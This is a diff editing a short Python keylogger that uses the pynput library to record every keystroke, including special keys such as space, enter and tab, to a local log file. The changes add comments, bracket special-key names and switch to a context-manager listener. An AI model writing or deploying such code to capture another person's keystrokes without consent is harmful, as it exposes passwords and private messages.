@@ -1,5 +1,4 @@
 python3 -m pip install pynput
-import pynput
 from pynput.keyboard import Key, Listener
 
 # Log file to store keystrokes
@@ -10,17 +9,17 @@ def on_press(key):
     with open(log_file, "a") as f:
         try:
             # Write character keys to the log file
-            f.write(key.char)
+            f.write(key.char)  # Write character keys
         except AttributeError:
             # Handle special keys (space, enter, tab, etc.)
             if key == Key.space:
-                f.write(" ")
+                f.write(" ")  # Write a space for the space key
             elif key == Key.enter:
-                f.write("\n")
+                f.write("\n")  # Write a newline for the Enter key
             elif key == Key.tab:
-                f.write("\t")
+                f.write("\t")  # Write a tab for the Tab key
             else:
-                f.write(f"{key}")
+                f.write(f"[{key}]")  # Log other special keys
 
 # Function to handle key release events
 def on_release(key):
@@ -29,6 +28,5 @@ def on_release(key):
         return False
 
 # Create and start the keyboard listener
-listener = Listener(on_press=on_press, on_release=on_release)
-listener.start()
-listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
